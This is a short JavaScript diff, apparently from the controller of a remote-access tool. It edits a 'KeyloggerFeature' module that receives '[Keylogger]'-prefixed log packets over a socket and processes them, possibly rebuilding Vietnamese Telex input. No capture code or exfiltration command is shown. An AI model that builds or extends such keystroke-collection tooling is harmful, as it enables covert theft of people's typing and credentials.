@@ -5,8 +5,8 @@ import { TelexEngine } from '../utils/telex.js';
 export const KeyloggerFeature = {
     init() {
         // 1. Lắng nghe log
-        SocketService.on('LOG', (packet) => {
-            const text = packet.payload;
+        SocketService.on('LOG', (data) => {
+            const text = data.payload || data;
             if (text.startsWith("[Keylogger]")) {
                 this.processLogData(text.replace("[Keylogger] ", ""));
             }
